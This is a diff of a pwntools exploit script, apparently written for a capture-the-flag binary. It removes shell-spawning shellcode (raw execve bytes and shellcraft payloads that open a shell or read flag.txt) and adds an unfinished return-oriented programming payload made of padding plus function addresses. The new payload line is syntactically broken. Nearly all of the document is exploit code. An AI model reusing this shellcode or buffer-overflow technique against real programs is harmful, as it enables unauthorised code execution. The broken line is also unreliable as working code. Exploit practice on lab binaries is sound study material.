@@ -1,12 +1,10 @@
 from pwn import *
 import json
 
-LOCAL = False
-PAYLOAD = False
-SHELL = True
-CAT = True
+LOCAL = True
 
-local_bin = "./vuln"
+local_bin = "./rop"
+elf = ELF(local_bin)
 
 if(LOCAL):
     p = process(local_bin)
@@ -23,25 +21,23 @@ else:
 
 
 #Shellcode I got from shellstorm db
-if(PAYLOAD):
-    payload = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
-    print p.recvline().decode()
-    p.sendline(payload)
-    p.interactive()
-    exit()
+#080485e6
+leapA = elf.symbols['leapA']
+#080485e6 is the start, but need to
+# also call with 0xDEADBEEF
+leap2 = elf.symbols['leap2']
+#08048666 but need to skip check
+'''
+8048689
+8048690
+'''
+leap3 = elf.symbols['leap3']
+display_flag = elf.symbols['display_flag']
+#080487c9
+main = elf.symbols['main']
 
-#Using Shellcraft library from pwntools to start a shell
-elif(SHELL):
-    payload = asm(shellcraft.i386.linux.sh())
-    print p.recvline().decode()
-    p.sendline(payload)
-    p.interactive()
-    exit()
-
-#using shellcraft library from pwntools to just cat the flag
-elif(CAT):
-    payload = asm(shellcraft.i386.linux.cat('flag.txt'))
-    print p.recvline().decode()
-    p.sendline(payload)
-    print p.recv()
-    exit()
+# python -c 'print "A" *28 + \xe6\x85\x04\x08'
+payload = "A"*28 + p32(leapA) + p32(main) + "A"*28 +
+print p.recv()
+p.sendline(payload)
+print p.recv()
